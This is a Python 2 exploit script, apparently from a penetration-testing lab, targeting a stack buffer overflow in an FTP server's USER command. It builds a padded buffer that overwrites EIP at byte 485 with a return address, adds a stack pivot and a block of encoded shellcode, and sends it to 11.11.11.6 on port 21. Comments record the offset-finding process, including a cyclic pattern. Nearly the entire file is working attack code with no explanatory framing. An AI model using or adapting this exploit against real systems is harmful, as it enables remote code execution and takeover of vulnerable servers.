#!/usr/bin/python
import socket


shellcode = ("\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81" +
"\x76\x0e\xc0\xaf\x22\x1e\x83\xee\xfc\xe2\xf4\x3c\x47" +
"\xa0\x1e\xc0\xaf\x42\x97\x25\x9e\xe2\x7a\x4b\xff\x12" +
"\x95\x92\xa3\xa9\x4c\xd4\x24\x50\x36\xcf\x18\x68\x38" +
"\xf1\x50\x8e\x22\xa1\xd3\x20\x32\xe0\x6e\xed\x13\xc1" +
"\x68\xc0\xec\x92\xf8\xa9\x4c\xd0\x24\x68\x22\x4b\xe3" +
"\x33\x66\x23\xe7\x23\xcf\x91\x24\x7b\x3e\xc1\x7c\xa9" +
"\x57\xd8\x4c\x18\x57\x4b\x9b\xa9\x1f\x16\x9e\xdd\xb2" +
"\x01\x60\x2f\x1f\x07\x97\xc2\x6b\x36\xac\x5f\xe6\xfb" +
"\xd2\x06\x6b\x24\xf7\xa9\x46\xe4\xae\xf1\x78\x4b\xa3" +
"\x69\x95\x98\xb3\x23\xcd\x4b\xab\xa9\x1f\x10\x26\x66" +
"\x3a\xe4\xf4\x79\x7f\x99\xf5\x73\xe1\x20\xf0\x7d\x44" +
"\x4b\xbd\xc9\x93\x9d\xc7\x11\x2c\xc0\xaf\x4a\x69\xb3" +
"\x9d\x7d\x4a\xa8\xe3\x55\x38\xc7\x50\xf7\xa6\x50\xae" +
"\x22\x1e\xe9\x6b\x76\x4e\xa8\x86\xa2\x75\xc0\x50\xf7" +
"\x74\xc8\xf6\x72\xfc\x3d\xef\x72\x5e\x90\xc7\xc8\x11" +
"\x1f\x4f\xdd\xcb\x57\xc7\x20\x1e\xd1\xf3\xab\xf8\xaa" +
"\xbf\x74\x49\xa8\x6d\xf9\x29\xa7\x50\xf7\x49\xa8\x18" +
"\xcb\x26\x3f\x50\xf7\x49\xa8\xdb\xce\x25\x21\x50\xf7" +
"\x49\x57\xc7\x57\x70\x8d\xce\xdd\xcb\xa8\xcc\x4f\x7a" +
"\xc0\x26\xc1\x49\x97\xf8\x13\xe8\xaa\xbd\x7b\x48\x22" +
"\x52\x44\xd9\x84\x8b\x1e\x1f\xc1\x22\x66\x3a\xd0\x69" +
"\x22\x5a\x94\xff\x74\x48\x96\xe9\x74\x50\x96\xf9\x71" +
"\x48\xa8\xd6\xee\x21\x46\x50\xf7\x97\x20\xe1\x74\x58" +
"\x3f\x9f\x4a\x16\x47\xb2\x42\xe1\x15\x14\xd2\xab\x62" +
"\xf9\x4a\xb8\x55\x12\xbf\xe1\x15\x93\x24\x62\xca\x2f" +
"\xd9\xfe\xb5\xaa\x99\x59\xd3\xdd\x4d\x74\xc0\xfc\xdd" +
"\xcb")


buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode

#actual module to jump to is 0x77c35459
#module to jump to is 0x77559BFF
#module to jump to is 0x7C9D30D7
#address is 00AFFD48
#eip is at byte 485
#esp is at byte 493, eight bytes away
#buffer = "A" * 1100
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('11.11.11.6',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
